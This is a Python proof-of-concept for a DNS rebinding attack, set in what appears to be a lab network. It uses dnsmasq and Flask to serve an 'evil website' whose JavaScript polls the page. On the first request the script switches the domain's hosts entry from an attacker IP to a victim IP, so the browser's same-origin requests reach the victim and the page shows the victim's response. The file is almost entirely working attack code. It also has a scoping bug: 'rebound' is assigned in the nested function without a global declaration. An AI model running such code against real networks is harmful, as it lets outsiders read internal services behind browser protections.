#!/usr/bin/env python3

from flask import Flask
from pathlib import Path
from signal import SIGHUP
from subprocess import Popen

HOSTS_FILE = '/home/demo/hosts'
INTERFACE = 'ens32'

# point to attacker, then rebind to victim
original = '172.16.235.4 bad.pwned.tk\n'
rebind = '172.16.235.5 bad.pwned.tk\n'

rebound = False

Path(HOSTS_FILE).write_text(original)
dnsmasq = Popen(['dnsmasq', '-h', '-H', HOSTS_FILE, '-d', '-i', INTERFACE, '-2', INTERFACE])

def main():
    app = Flask(__name__)
    @app.route('/')
    def index():
        result = '''<html>
  <body>
    <p>I'm an evil website!</p>
    <script>
      var i = setInterval(function() {
        var r = new XMLHttpRequest()
        r.open('GET', '/', true)
        r.onload = function() {
          if (r.readyState === 4) {
            if (r.status === 200) {
              document.body.append('💤')
              if (!(r.responseText.includes('evil'))) {
                document.body.append(r.responseText)
                clearInterval(i)
              }
            }
          }
        }
        r.send()
      }, 5000)
    </script>
  </body>
</html>
'''
        if rebound == False:
            Path(HOSTS_FILE).write_text(rebind)
            dnsmasq.send_signal(SIGHUP)
            rebound = True
        return result, 200

    app.run(host='0.0.0.0', port=5000)

if __name__ == '__main__':
    main()
    dnsmasq.terminate()
